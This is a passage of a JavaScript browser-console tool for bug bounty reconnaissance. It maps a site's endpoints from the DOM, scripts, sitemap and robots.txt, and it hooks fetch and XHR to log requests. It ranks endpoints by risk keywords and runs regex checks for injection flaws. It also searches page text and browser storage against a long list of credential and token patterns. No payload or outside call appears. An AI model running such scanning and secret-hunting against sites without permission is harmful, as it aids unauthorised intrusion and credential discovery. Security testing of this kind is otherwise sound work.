// 🔥💀 CRITICAL FLAW HUNTER - Post-Mapping Bug Bounty Workflow
// Execute in browser dev tools for comprehensive attack surface analysis
// Author: ArkhAngelLifeJiggy | Platform: Universal

(function () {
  "use strict";

  // 🎯 Attack Surface Categories & Risk Scoring
  const RISK_CATEGORIES = {
    AUTHENTICATION: {
      name: "🔐 Authentication/Session",
      priority: "CRITICAL",
      score: 100,
      patterns: [
        "login",
        "signin",
        "authenticate",
        "auth",
        "oauth",
        "sso",
        "2fa",
        "mfa",
        "otp",
        "verification",
        "verify",
        "jwt",
        "token",
        "session",
        "cookie",
        "bearer",
        "password",
        "reset",
        "forgot",
        "recovery",
        "register",
        "signup",
        "create-account",
        "account",
      ],
      endpoints: ["/login", "/auth", "/signin", "/oauth", "/token", "/session"],
    },
    ACCESS_CONTROL: {
      name: "🛡️ Access Control",
      priority: "HIGH",
      score: 90,
      patterns: [
        "admin",
        "dashboard",
        "panel",
        "manage",
        "settings",
        "delete",
        "remove",
        "destroy",
        "edit",
        "update",
        "modify",
        "view",
        "read",
        "fetch",
        "get",
        "download",
        "export",
        "permission",
        "role",
        "privilege",
        "access",
        "authorize",
      ],
      endpoints: ["/admin", "/dashboard", "/api/users", "/settings", "/manage"],
    },
    DATA_INPUT: {
      name: "📝 Data Input & Rendering",
      priority: "HIGH",
      score: 85,
      patterns: [
        "submit",
        "post",
        "create",
        "add",
        "insert",
        "save",
        "upload",
        "file",
        "image",
        "document",
        "attachment",
        "comment",
        "message",
        "chat",
        "feedback",
        "review",
        "search",
        "query",
        "filter",
        "sort",
        "custom",
      ],
      endpoints: ["/upload", "/submit", "/create", "/post", "/comment"],
    },
    BUSINESS_LOGIC: {
      name: "💰 Business Transactions",
      priority: "CRITICAL",
      score: 95,
      patterns: [
        "checkout",
        "payment",
        "pay",
        "purchase",
        "buy",
        "subscription",
        "subscribe",
        "billing",
        "invoice",
        "refund",
        "cancel",
        "credit",
        "balance",
        "wallet",
        "transfer",
        "withdraw",
        "deposit",
        "transaction",
      ],
      endpoints: [
        "/checkout",
        "/payment",
        "/billing",
        "/subscription",
        "/wallet",
      ],
    },
    API_ENDPOINTS: {
      name: "🔌 API & State Changes",
      priority: "HIGH",
      score: 80,
      patterns: [
        "api",
        "rest",
        "graphql",
        "json",
        "xml",
        "put",
        "post",
        "patch",
        "delete",
        "options",
        "fetch",
        "xhr",
        "ajax",
        "websocket",
        "sse",
      ],
      endpoints: ["/api", "/graphql", "/rest", "/v1", "/v2"],
    },
    SESSION_MANAGEMENT: {
      name: "🔑 Session Management",
      priority: "CRITICAL",
      score: 95,
      patterns: [
        "session",
        "cookie",
        "logout",
        "invalidate",
        "timeout",
        "renew",
        "regenerate",
        "fixation",
        "hijacking",
        "secure",
        "httponly",
        "samesite",
      ],
      endpoints: ["/logout", "/session", "/renew", "/invalidate"],
    },
    INPUT_VALIDATION: {
      name: "✅ Input Validation",
      priority: "HIGH",
      score: 85,
      patterns: [
        "validate",
        "sanitize",
        "filter",
        "escape",
        "encode",
        "whitelist",
        "blacklist",
        "regex",
        "pattern",
        "length",
        "type",
        "required",
      ],
      endpoints: ["/validate", "/sanitize", "/filter"],
    },
    ERROR_HANDLING: {
      name: "🚨 Error Handling",
      priority: "HIGH",
      score: 75,
      patterns: [
        "error",
        "exception",
        "try",
        "catch",
        "throw",
        "stack",
        "trace",
        "log",
        "debug",
        "warning",
        "fatal",
        "500",
        "404",
      ],
      endpoints: ["/error", "/500", "/404"],
    },
    THIRD_PARTY_INTEGRATIONS: {
      name: "🔗 Third-Party Integrations",
      priority: "HIGH",
      score: 70,
      patterns: [
        "third-party",
        "external",
        "integration",
        "oauth",
        "webhook",
        "callback",
        "embed",
        "iframe",
        "cdn",
        "analytics",
        "payment",
        "social",
      ],
      endpoints: ["/oauth", "/webhook", "/callback", "/embed"],
    },
  };

  // 🎯 Critical Flaw Hunter Class
  class CriticalFlawHunter {
    constructor() {
      this.discoveredEndpoints = new Map();
      this.attackSurface = new Map();
      this.vulnerabilities = [];
      this.riskScore = 0;
      this.initialized = false;

      console.log(
        "%c🔥💀 CRITICAL FLAW HUNTER LOADED 💀🔥",
        "color: red; font-size: 20px; font-weight: bold;"
      );
      console.log(
        "%cBug Bounty Post-Mapping Workflow Ready",
        "color: orange; font-size: 14px;"
      );
    }

    // 🚀 Initialize and start hunting
    async hunt() {
      console.log(
        "%c🎯 STARTING CRITICAL FLAW HUNTING...",
        "color: yellow; font-size: 16px; font-weight: bold;"
      );

      this.showBanner();
      await this.mapAttackSurface();
      this.prioritizeEndpoints();
      this.analyzeJavaScriptFlows();
      this.identifyStateChangers();
      this.findGatekeepers();
      this.generateReport();

      return this.getResults();
    }

    showBanner() {
      console.log(`
╔═══════════════════════════════════════════════════════════════╗
║                🔥💀 CRITICAL FLAW HUNTER 💀🔥                ║
║           Post-Mapping Bug Bounty Workflow Tool              ║
║                                                               ║
║  🎯 Attack Surface Prioritization                            ║
║  🔍 Critical Endpoint Discovery                              ║
║  ⚡ State-Changer Identification                            ║
║  🛡️ Gatekeeper Bypass Detection                            ║
╚═══════════════════════════════════════════════════════════════╝
            `);
    }

    // 🗺️ Map entire attack surface
    async mapAttackSurface() {
      console.log(
        "%c🗺️ MAPPING ATTACK SURFACE...",
        "color: cyan; font-weight: bold;"
      );

      // Discover endpoints from various sources
      await this.discoverFromDOM();
      await this.discoverFromJavaScript();
      await this.discoverFromNetworkRequests();
      await this.discoverFromSitemap();
      await this.discoverFromRobots();

      // Enhanced: Check for sensitive data exposure
      await this.checkForSensitiveDataExposure();

      console.log(
        `📊 Discovered ${this.discoveredEndpoints.size} unique endpoints`
      );
    }

    // 🔍 Discover endpoints from DOM
    async discoverFromDOM() {
      console.log("🔍 Scanning DOM for endpoints...");

      // Forms
      document.querySelectorAll("form").forEach((form) => {
        const action = form.action || form.getAttribute("action");
        if (action) {
          this.addEndpoint(action, "DOM_FORM", {
            method: form.method || "GET",
            element: form,
            type: "form",
          });
        }
      });

      // Links
      document.querySelectorAll("a[href]").forEach((link) => {
        const href = link.href;
        if (href && !href.startsWith("mailto:") && !href.startsWith("tel:")) {
          this.addEndpoint(href, "DOM_LINK", {
            text: link.textContent?.trim(),
            element: link,
            type: "link",
          });
        }
      });

      // AJAX endpoints from data attributes
      document
        .querySelectorAll("[data-url], [data-endpoint], [data-action]")
        .forEach((el) => {
          const url =
            el.dataset.url || el.dataset.endpoint || el.dataset.action;
          if (url) {
            this.addEndpoint(url, "DOM_DATA", {
              element: el,
              type: "data-attribute",
            });
          }
        });

      console.log("✅ DOM scan complete");
    }

    // 📜 Discover from JavaScript
    async discoverFromJavaScript() {
      console.log("📜 Analyzing JavaScript for endpoints...");

      const scripts = Array.from(document.querySelectorAll("script"));
      const jsSources = [];

      // Extract inline scripts first (always available)
      scripts.forEach((script) => {
        if (!script.src) {
          // Inline script
          jsSources.push({
            type: "inline",
            content: script.innerHTML,
            element: script
          });
        }
      });

      // Handle external scripts with CORS-aware fetching
      const externalScripts = scripts.filter(s => s.src);
      console.log(`🔍 Found ${externalScripts.length} external scripts, ${jsSources.length} inline scripts`);

      if (externalScripts.length > 0) {
        console.log("🌐 Attempting to fetch external scripts (CORS-aware)...");

        // Process external scripts in parallel with error handling
        const externalPromises = externalScripts.map(async (script) => {
          try {
            // Create AbortController for timeout
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 second timeout

            const response = await fetch(script.src, {
              method: 'GET',
              signal: controller.signal,
              mode: 'cors' // Explicit CORS mode
            });

            clearTimeout(timeoutId);

            if (response.ok) {
              const content = await response.text();
              return {
                type: "external",
                src: script.src,
                content: content,
                element: script,
                status: "success"
              };
            } else {
              return {
                type: "external",
                src: script.src,
                content: "",
                element: script,
                status: "failed",
                error: `HTTP ${response.status}`
              };
            }
          } catch (e) {
            return {
              type: "external",
              src: script.src,
              content: "",
              element: script,
              status: "failed",
              error: e.message.includes('CORS') ? 'CORS blocked' : e.message
            };
          }
        });

        // Wait for all external script fetches to complete (or fail)
        const externalResults = await Promise.allSettled(externalPromises);

        externalResults.forEach((result) => {
          if (result.status === 'fulfilled') {
            const scriptData = result.value;
            jsSources.push(scriptData);

            if (scriptData.status === 'success') {
              console.log(`✅ Fetched external script: ${scriptData.src.split('/').pop()}`);
            } else {
              console.log(`⚠️ Skipped external script (${scriptData.error}): ${scriptData.src.split('/').pop()}`);
            }
          } else {
            console.log(`❌ Failed to process external script: ${result.reason}`);
          }
        });
      }

      const jsContent = jsSources.map(s => s.content).join("\n");

      // Common URL patterns
      const urlPatterns = [
        /(['"`])([\/][\w\-\.\/\?=&%]+)\1/g,
        /(fetch|axios|xhr|ajax)\s*\(\s*['"`]([^'"`]+)['"`]/g,
        /url\s*:\s*['"`]([^'"`]+)['"`]/g,
        /action\s*:\s*['"`]([^'"`]+)['"`]/g,
        /endpoint\s*:\s*['"`]([^'"`]+)['"`]/g,

        // New additions
        /src\s*=\s*['"`]([^'"`]+)['"`]/g,                  // <script>, <img>, <iframe> src
        /href\s*=\s*['"`]([^'"`]+)['"`]/g,                 // <a>, <link> href
        /location\.(href|assign|replace)\s*=\s*['"`]([^'"`]+)['"`]/g, // JS redirects
        /window\.open\s*\(\s*['"`]([^'"`]+)['"`]/g,        // Opening new windows/tabs
        /importScripts\s*\(\s*['"`]([^'"`]+)['"`]/g,       // Web worker script imports
        /navigator\.sendBeacon\s*\(\s*['"`]([^'"`]+)['"`]/g, // sendBeacon calls
        /postMessage\s*\(\s*['"`]([^'"`]+)['"`]/g,         // Cross-window messaging
        /data-src\s*=\s*['"`]([^'"`]+)['"`]/g,             // Lazy-loaded resources
        /manifest\s*=\s*['"`]([^'"`]+)['"`]/g,             // HTML manifest attribute
        /form\s+action\s*=\s*['"`]([^'"`]+)['"`]/g,        // Form submissions
        /background\s*=\s*['"`]([^'"`]+)['"`]/g,           // Background image URLs
        /content\s*=\s*['"`]url\(([^)]+)\)['"`]/g,         // CSS content:url()
        /@import\s+['"`]([^'"`]+)['"`]/g,                  // CSS @import
        /srcset\s*=\s*['"`]([^'"`]+)['"`]/g,               // Responsive image srcset
        /meta\s+http-equiv=["']refresh["']\s+content=["'][^;]+;\s*url=([^"']+)["']/gi, // Meta refresh redirects
        /Response\.redirect\s*\(\s*['"`]([^'"`]+)['"`]/g,  // Fetch API Response.redirect
        /openDatabase\s*\(\s*['"`]([^'"`]+)['"`]/g,        // WebSQL DB URLs
        /connect\s*\(\s*['"`]([^'"`]+)['"`]/g              // WebSocket.connect or DB connect
      ];

      urlPatterns.forEach((pattern) => {
        let match;
        while ((match = pattern.exec(jsContent)) !== null) {
          const url = match[2] || match[1];
          if (url && url.startsWith("/")) {
            this.addEndpoint(url, "JAVASCRIPT", {
              pattern: pattern.source,
              type: "js-pattern",
              scriptType: jsSources.find(s => s.content.includes(match[0]))?.type || "unknown"
            });
          }
        }
      });

      // Extract user functionality flows
      this.extractUserFlows(jsSources);

      const successfulExternal = jsSources.filter(s => s.type === 'external' && s.status === 'success').length;
      const failedExternal = jsSources.filter(s => s.type === 'external' && s.status === 'failed').length;
      const inlineCount = jsSources.filter(s => s.type === 'inline').length;

      console.log(`📊 JavaScript analysis summary:`);
      console.log(`   ✅ Inline scripts: ${inlineCount}`);
      console.log(`   ✅ External scripts fetched: ${successfulExternal}`);
      console.log(`   ⚠️ External scripts skipped (CORS): ${failedExternal}`);
      console.log(`   📊 Total scripts processed: ${jsSources.length}`);

      if (failedExternal > 0) {
        console.log(`💡 Note: CORS restrictions are normal for third-party scripts (analytics, ads, etc.)`);
        console.log(`   The tool continues with available inline scripts and successfully fetched external scripts`);
      }

      console.log("✅ JavaScript analysis complete");
    }

    // 🌐 Discover from network requests
    async discoverFromNetworkRequests() {
      console.log("🌐 Monitoring network requests...");

      // Hook fetch
      const originalFetch = window.fetch;
      window.fetch = (...args) => {
        const url = args[0];
        if (typeof url === "string") {
          this.addEndpoint(url, "NETWORK_FETCH", {
            type: "fetch-intercept",
          });
        }
        return originalFetch.apply(window, args);
      };

      // Hook XMLHttpRequest
      const originalXHROpen = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function (method, url, ...args) {
        if (url) {
          hunter.addEndpoint(url, "NETWORK_XHR", {
            method: method,
            type: "xhr-intercept",
          });
        }
        return originalXHROpen.apply(this, [method, url, ...args]);
      };

      console.log("✅ Network monitoring active");
    }

    // 🗺️ Discover from sitemap
    async discoverFromSitemap() {
      try {
        const sitemapResponse = await fetch("/sitemap.xml");
        if (sitemapResponse.ok) {
          const sitemapText = await sitemapResponse.text();
          const parser = new DOMParser();
          const sitemapDoc = parser.parseFromString(sitemapText, "text/xml");

          sitemapDoc.querySelectorAll("loc").forEach((loc) => {
            const url = loc.textContent.trim();
            this.addEndpoint(url, "SITEMAP", {
              type: "sitemap",
            });
          });

          console.log("✅ Sitemap parsed");
        }
      } catch (e) {
        console.log("⚠️ No sitemap found or accessible");
      }
    }

    // 🤖 Discover from robots.txt
    async discoverFromRobots() {
      try {
        const robotsResponse = await fetch("/robots.txt");
        if (robotsResponse.ok) {
          const robotsText = await robotsResponse.text();
          const lines = robotsText.split("\n");

          lines.forEach((line) => {
            const disallowMatch = line.match(/Disallow:\s*(.+)/i);
            if (disallowMatch) {
              const path = disallowMatch[1].trim();
              this.addEndpoint(path, "ROBOTS", {
                type: "robots-disallow",
              });
            }
          });

          console.log("✅ Robots.txt parsed");
        }
      } catch (e) {
        console.log("⚠️ No robots.txt found or accessible");
      }
    }

    // 🔒 Check for sensitive data exposure
    async checkForSensitiveDataExposure() {
      console.log("🔒 Checking for sensitive data exposure...");

      const sensitivePatterns = [
        /password|secret|key|token|api[_-]?key/i,
        /credit[_-]?card|ssn|social[_-]?security/i,
        /email|phone|address|personal/i,
        /config|env|settings/i,
        /auth[_-]?token|bearer[_-]?token/i,
        /access[_-]?token|refresh[_-]?token/i,
        /private[_-]?key|public[_-]?key/i,
        /aws[_-]?(access|secret)[_-]?key/i,
        /gcp[_-]?key|google[_-]?api[_-]?key/i,
        /azure[_-]?key|azure[_-]?secret/i,
        /slack[_-]?token|discord[_-]?token/i,
        /github[_-]?token|gitlab[_-]?token/i,
        /jwt|json[_-]?web[_-]?token/i,
        /session[_-]?id|session[_-]?token/i,
        /csrf[_-]?token|xsrf[_-]?token/i,
        /otp|one[_-]?time[_-]?password/i,
        /pin[_-]?code|security[_-]?code/i,
        /iban|swift[_-]?code|routing[_-]?number/i,
        /passport[_-]?number|driver[_-]?license/i,
        /tax[_-]?id|tin|ein/i,
        /medical[_-]?record|health[_-]?id/i,
        /firebase[_-]?api[_-]?key/i,
        /mapbox[_-]?token|stripe[_-]?key/i,
        /paypal[_-]?client[_-]?id|paypal[_-]?secret/i,
        /square[_-]?access[_-]?token/i,
        /twilio[_-]?auth[_-]?token/i,
        /sendgrid[_-]?api[_-]?key/i,
        /mailgun[_-]?api[_-]?key/i,
        /algolia[_-]?api[_-]?key/i,
        /s3[_-]?bucket|cloudfront[_-]?url/i,
        /ssh[_-]?key|pgp[_-]?key/i,
        /rsa[_-]?private[_-]?key/i
      ];

      // Check page content for sensitive data
      const pageText = document.body.innerText;
      sensitivePatterns.forEach((pattern) => {
        if (pattern.test(pageText)) {
          this.addVulnerability("SENSITIVE_DATA_EXPOSURE", "CRITICAL", {
            pattern: pattern.source,
            description: "Potential sensitive data exposure in page content",
            location: "page_content"
          });
        }
      });

      // Check localStorage and sessionStorage
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        if (sensitivePatterns.some(p => p.test(key) || p.test(value))) {
          this.addVulnerability("SENSITIVE_DATA_EXPOSURE", "HIGH", {
            storage: "localStorage",
            key: key,
            description: `Sensitive data found in localStorage key: ${key}`,
            location: "localStorage"
          });
        }
      }

      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        if (sensitivePatterns.some(p => p.test(key) || p.test(value))) {
          this.addVulnerability("SENSITIVE_DATA_EXPOSURE", "HIGH", {
            storage: "sessionStorage",
            key: key,
            description: `Sensitive data found in sessionStorage key: ${key}`,
            location: "sessionStorage"
          });
        }
      }
    }

    // ➕ Add discovered endpoint
    addEndpoint(url, source, metadata = {}) {
      try {
        const cleanUrl = this.cleanUrl(url);
        if (!cleanUrl) return;

        if (!this.discoveredEndpoints.has(cleanUrl)) {
          this.discoveredEndpoints.set(cleanUrl, {
            url: cleanUrl,
            sources: [source],
            metadata: [metadata],
            riskScore: 0,
            category: null,
            discovered: Date.now(),
          });
        } else {
          const existing = this.discoveredEndpoints.get(cleanUrl);
          if (!existing.sources.includes(source)) {
            existing.sources.push(source);
            existing.metadata.push(metadata);
          }
        }
      } catch (e) {
        // Invalid URL, skip
      }
    }

    // 🧹 Clean and normalize URL
    cleanUrl(url) {
      if (!url) return null;

      try {
        // Handle relative URLs
        if (url.startsWith("/")) {
          url = window.location.origin + url;
        } else if (!url.startsWith("http")) {
          return null; // Skip invalid URLs
        }

        const urlObj = new URL(url);
        return urlObj.pathname + urlObj.search;
      } catch (e) {
        return null;
      }
    }

    // 🎯 Prioritize endpoints by risk
    prioritizeEndpoints() {
      console.log(
        "%c🎯 PRIORITIZING ATTACK SURFACE...",
        "color: orange; font-weight: bold;"
      );

      this.discoveredEndpoints.forEach((endpoint, url) => {
        let highestScore = 0;
        let matchedCategory = null;

        // Check against risk categories
        Object.entries(RISK_CATEGORIES).forEach(([key, category]) => {
          const score = this.calculateRiskScore(url, category);
          if (score > highestScore) {
            highestScore = score;
            matchedCategory = key;
          }
        });

        endpoint.riskScore = highestScore;
        endpoint.category = matchedCategory;

        if (highestScore > 0) {
          if (!this.attackSurface.has(matchedCategory)) {
            this.attackSurface.set(matchedCategory, []);
          }
          this.attackSurface.get(matchedCategory).push(endpoint);
        }
      });

      this.displayPrioritizedSurface();
    }

    // 📊 Calculate risk score for endpoint
    calculateRiskScore(url, category) {
      let score = 0;
      const urlLower = url.toLowerCase();

      // Pattern matching
      category.patterns.forEach((pattern) => {
        if (urlLower.includes(pattern)) {
          score += 10;
        }
      });

      // Endpoint matching
      category.endpoints.forEach((endpoint) => {
        if (urlLower.includes(endpoint)) {
          score += 20;
        }
      });

      // Enhanced: Additional critical risk factors
      const criticalPatterns = [
        "admin", "root", "superuser", "god", "master",
        "debug", "test", "dev", "staging", "backup",
        "config", "settings", "internal", "private",
        "secret", "key", "token", "auth", "login",
        "sysadmin", "administrator", "owner", "maintainer",
        "operator", "moderator", "support", "helpdesk",
        "security", "vault", "credential", "passwd",
        "password", "apikey", "accesstoken", "refreshtoken",
        "bearer", "session", "cookie", "jwt", "ssh",
        "rsa", "pgp", "certificate", "cert", "pem",
        "env", "environment", "sandbox", "production",
        "prod", "live", "release", "build", "deploy",
        "pipeline", "ci", "cd", "monitor", "metrics",
        "health", "status", "uptime", "error", "exception",
        "trace", "log", "logging", "report", "dump",
        "heapdump", "threaddump", "diagnostic", "inspector",
        "explorer", "shell", "terminal", "console", "repl"
      ];

      criticalPatterns.forEach((pattern) => {
        if (urlLower.includes(pattern)) {
          score += 15; // Bonus for critical patterns
        }
      });

      // Enhanced: Length-based risk (shorter URLs might be more critical)
      if (url.length < 20) {
        score += 5;
      }

      // Apply category weight
      return score * (category.score / 100);
    }

    // 📋 Display prioritized attack surface
    displayPrioritizedSurface() {
      console.log(
        "%c📋 PRIORITIZED ATTACK SURFACE:",
        "color: yellow; font-weight: bold;"
      );

      // Sort categories by priority
      const sortedCategories = Array.from(this.attackSurface.entries()).sort(
        ([, a], [, b]) => {
          const aScore = Math.max(...a.map((e) => e.riskScore));
          const bScore = Math.max(...b.map((e) => e.riskScore));
          return bScore - aScore;
        }
      );

      sortedCategories.forEach(([categoryKey, endpoints]) => {
        const category = RISK_CATEGORIES[categoryKey];
        console.log(
          `\n${category.name} [${category.priority}] (${endpoints.length} endpoints)`
        );
        console.log("═".repeat(50));

        // Sort endpoints by risk score
        endpoints.sort((a, b) => b.riskScore - a.riskScore);

        endpoints.slice(0, 10).forEach((endpoint) => {
          // Show top 10
          console.log(
            `🎯 ${endpoint.url} (Score: ${endpoint.riskScore.toFixed(1)})`
          );
          console.log(`   Sources: ${endpoint.sources.join(", ")}`);
        });

        if (endpoints.length > 10) {
          console.log(`   ... and ${endpoints.length - 10} more endpoints`);
        }
      });
    }

    // ⚡ Analyze JavaScript execution flows
    analyzeJavaScriptFlows() {
      console.log(
        "%c⚡ ANALYZING JAVASCRIPT FLOWS...",
        "color: lightblue; font-weight: bold;"
      );

      const flows = this.extractJSFlows();
      this.analyzeFlowVulnerabilities(flows);
    }

    // 📜 Extract JS execution flows
    extractJSFlows() {
      const flows = [];
      const elements = document.querySelectorAll("*");

      // Event listeners (only if getEventListeners is available, e.g., in Chrome DevTools)
      if (typeof getEventListeners !== 'undefined') {
        try {
          elements.forEach((el) => {
            const events = getEventListeners(el) || {};
            Object.keys(events).forEach((eventType) => {
              events[eventType].forEach((listener) => {
                flows.push({
                  type: "event-listener",
                  element: el,
                  event: eventType,
                  listener: listener.listener.toString(),
                  useCapture: listener.useCapture,
                });
              });
            });
          });
        } catch (e) {
          console.log("⚠️ Error accessing getEventListeners:", e.message);
        }
      } else {
        console.log("⚠️ getEventListeners not available (requires Chrome DevTools context)");
        // Fallback: Extract event handlers from JavaScript code analysis
        this.extractEventHandlersFromCode(flows);
      }

      // Inline event handlers
      elements.forEach((el) => {
        const attributes = Array.from(el.attributes);
        attributes.forEach((attr) => {
          if (attr.name.startsWith("on")) {
            flows.push({
              type: "inline-handler",
              element: el,
              event: attr.name,
              code: attr.value,
            });
          }
        });
      });

      console.log(`📊 Extracted ${flows.length} JavaScript flows`);
      return flows;
    }

    // 🔍 Analyze flow vulnerabilities
    analyzeFlowVulnerabilities(flows) {
      flows.forEach((flow) => {
        const code = flow.listener || flow.code || "";

        // Enhanced DOM XSS detection
        if (this.hasXSSPattern(code)) {
          this.addVulnerability("XSS", "HIGH", {
            flow: flow,
            description: "Potential XSS in JavaScript flow",
          });
        }

        // Enhanced DOM XSS patterns
        if (this.hasDOMXSSPattern(code)) {
          this.addVulnerability("DOM_XSS", "CRITICAL", {
            flow: flow,
            description: "DOM-based XSS vulnerability detected",
          });
        }

        // DOM manipulation without sanitization
        if (this.hasUnsafeDOMPattern(code)) {
          this.addVulnerability("DOM_XSS", "HIGH", {
            flow: flow,
            description: "Unsafe DOM manipulation detected",
          });
        }

        // SQL Injection detection
        if (this.hasSQLInjectionPattern(code)) {
          this.addVulnerability("SQL_INJECTION", "CRITICAL", {
            flow: flow,
            description: "Potential SQL injection vulnerability",
          });
        }

        // Command Injection detection
        if (this.hasCommandInjectionPattern(code)) {
          this.addVulnerability("COMMAND_INJECTION", "CRITICAL", {
            flow: flow,
            description: "Potential command injection vulnerability",
          });
        }

        // IDOR detection
        if (this.hasIDORPattern(code)) {
          this.addVulnerability("IDOR", "HIGH", {
            flow: flow,
            description: "Potential IDOR vulnerability",
          });
        }

        // LFI/RFI detection
        if (this.hasFileInclusionPattern(code)) {
          this.addVulnerability("FILE_INCLUSION", "HIGH", {
            flow: flow,
            description: "Potential file inclusion vulnerability",
          });
        }

        // SSTI detection
        if (this.hasSSTIpattern(code)) {
          this.addVulnerability("SSTI", "HIGH", {
            flow: flow,
            description: "Potential server-side template injection",
          });
        }

        // Eval usage
        if (code.includes("eval(") || code.includes("Function(")) {
          this.addVulnerability("CODE_INJECTION", "CRITICAL", {
            flow: flow,
            description: "Dynamic code execution detected",
          });
        }

        // Enhanced: Additional critical checks
        // Prototype pollution
        if (code.includes("__proto__") || code.includes("constructor")) {
          this.addVulnerability("PROTOTYPE_POLLUTION", "CRITICAL", {
            flow: flow,
            description: "Potential prototype pollution vulnerability",
          });
        }

        // Insecure random generation
        if (code.includes("Math.random") && !code.includes("crypto")) {
          this.addVulnerability("WEAK_RANDOM", "MEDIUM", {
            flow: flow,
            description: "Weak random number generation detected",
          });
        }

        // Hardcoded secrets
        const secretPatterns = /['"`](password|secret|key|token).*?['"`]/gi;
        if (secretPatterns.test(code)) {
          this.addVulnerability("HARDCODED_SECRETS", "HIGH", {
            flow: flow,
            description: "Potential hardcoded secrets in JavaScript",
          });
        }

        // Insecure deserialization
        if (code.includes("JSON.parse") && code.includes("eval")) {
          this.addVulnerability("INSECURE_DESERIALIZATION", "HIGH", {
            flow: flow,
            description: "Potential insecure deserialization",
          });
        }
      });

      // Extract numeric values from JavaScript
      this.extractNumericValues(flows);
    }

    // 🔢 Extract numeric values from JavaScript flows
    extractNumericValues(flows) {
      console.log("🔢 Extracting numeric values from JavaScript...");

      const numericValues = [];
      const numberPattern = /\b\d+\.?\d*\b/g;

      flows.forEach((flow) => {
        const code = flow.listener || flow.code || "";
        const matches = code.match(numberPattern);

        if (matches) {
          matches.forEach((num) => {
            const numericValue = parseFloat(num);
            if (!isNaN(numericValue)) {
              numericValues.push({
                value: numericValue,
                original: num,
                flow: flow,
                context: code.substring(Math.max(0, code.indexOf(num) - 20), code.indexOf(num) + num.length + 20)
              });
            }
          });
        }
      });

      if (numericValues.length > 0) {
        console.log(`📊 Found ${numericValues.length} numeric values:`);
        numericValues.slice(0, 20).forEach((item, i) => {
          console.log(`  ${i + 1}. ${item.value} (context: ${item.context})`);
        });

        if (numericValues.length > 20) {
          console.log(`  ... and ${numericValues.length - 20} more`);
        }
      }
    }

    // 🔄 Extract user functionality flows
    extractUserFlows(jsSources) {
      console.log("🔄 Extracting user functionality flows...");

      const userFlows = [];
      const flowPatterns = [
        /(function|const|let|var)\s+(\w+)\s*[=]\s*(.*)/g, // Function definitions
        /(\w+)\.addEventListener\s*\(\s*['"`](\w+)['"`]/g, // Event listeners
        /(\w+)\.onclick\s*=/g, // Click handlers
        /(\w+)\.onsubmit\s*=/g, // Form handlers
        /fetch\s*\(\s*['"`]([^'"`]+)['"`]/g, // API calls
        /axios\.(get|post|put|delete)\s*\(\s*['"`]([^'"`]+)['"`]/g, // Axios calls
        /(\w+)\.onchange\s*=/g, // Change handlers
        /(\w+)\.oninput\s*=/g, // Input handlers
        /(\w+)\.onerror\s*=/g, // Error handlers
        /(\w+)\.onload\s*=/g, // Load handlers
        /XMLHttpRequest\s*\(/g, // Raw XHR usage
        /xhr\.open\s*\(\s*['"`](GET|POST|PUT|DELETE)['"`]\s*,\s*['"`]([^'"`]+)['"`]/gi, // XHR open calls
        /WebSocket\s*\(\s*['"`]([^'"`]+)['"`]/g, // WebSocket connections
        /postMessage\s*\(\s*['"`]([^'"`]+)['"`]/g, // postMessage calls
        /location\.(href|assign|replace)\s*=\s*['"`]([^'"`]+)['"`]/g, // Redirects
        /window\.open\s*\(\s*['"`]([^'"`]+)['"`]/g, // New window/tab opens
        /document\.cookie\s*=/g, // Cookie writes
        /localStorage\.(setItem|getItem)\s*\(\s*['"`]([^'"`]+)['"`]/g, // LocalStorage access
        /sessionStorage\.(setItem|getItem)\s*\(\s*['"`]([^'"`]+)['"`]/g, // SessionStorage access
        /navigator\.sendBeacon\s*\(\s*['"`]([^'"`]+)['"`]/g, // sendBeacon calls
        /importScripts\s*\(\s*['"`]([^'"`]+)['"`]/g, // Web Worker script imports
        /eval\s*\(/g, // eval usage
        /new\s+Function\s*\(/g, // Function constructor usage
        /setTimeout\s*\(\s*['"`]/g, // String-based setTimeout
        /setInterval\s*\(\s*['"`]/g // String-based setInterval
      ];

      jsSources.forEach((source, sourceIndex) => {
        // Skip empty content from failed external scripts
        if (!source.content || source.content.trim().length === 0) {
          return;
        }

        try {
          const lines = source.content.split('\n');

          flowPatterns.forEach((pattern) => {
            let match;
            while ((match = pattern.exec(source.content)) !== null) {
              const lineNumber = this.getLineNumber(source.content, match.index);
              userFlows.push({
                type: this.getFlowType(match[0]),
                name: match[2] || match[1] || 'unknown',
                code: match[0].trim(),
                line: lineNumber,
                source: source.type === 'external' ? source.src : `inline_script_${sourceIndex}`,
                sourceType: source.type,
                context: lines[lineNumber - 1]?.trim() || 'N/A'
              });
            }
          });
        } catch (e) {
          console.log(`⚠️ Error processing ${source.type} script: ${e.message}`);
        }
      });

      if (userFlows.length > 0) {
        console.log(`🔄 Found ${userFlows.length} user functionality flows:`);
        userFlows.slice(0, 15).forEach((flow, i) => {
          console.log(`  ${i + 1}. ${flow.type}: ${flow.name} (${flow.source}:${flow.line})`);
          console.log(`     ${flow.code}`);
        });

        if (userFlows.length > 15) {
          console.log(`  ... and ${userFlows.length - 15} more flows`);
        }
      } else {
        console.log(`🔄 No user functionality flows found (likely due to external script CORS restrictions)`);
      }
    }

    // Get line number from content and index
    getLineNumber(content, index) {
      const lines = content.substring(0, index).split('\n');
      return lines.length;
    }

    // Determine flow type from code
    getFlowType(code) {
      if (code.includes('function') || code.includes('=>')) return 'function';
      if (code.includes('addEventListener')) return 'event_listener';
      if (code.includes('onclick') || code.includes('onsubmit')) return 'dom_handler';
      if (code.includes('fetch') || code.includes('axios')) return 'api_call';
      return 'other';
    }

    // Extract event handlers from JavaScript code when getEventListeners is unavailable
    extractEventHandlersFromCode(flows) {
      console.log("🔍 Extracting event handlers from JavaScript code...");

      const scripts = Array.from(document.querySelectorAll("script"));
      const jsContent = scripts.map((s) => s.innerHTML).join("\n");

      // Patterns for event handler detection
      const eventPatterns = [
        /\.addEventListener\s*\(\s*['"`](\w+)['"`]/g,
        /\.on(\w+)\s*=/g,
        /addEventListener\s*\(\s*['"`](\w+)['"`]/g,
      ];

      eventPatterns.forEach((pattern) => {
        let match;
        while ((match = pattern.exec(jsContent)) !== null) {
          const eventType = match[1] || match[0].match(/(\w+)/)?.[1];
          if (eventType) {
            flows.push({
              type: "code-detected-event",
              element: null,
              event: eventType,
              code: match[0],
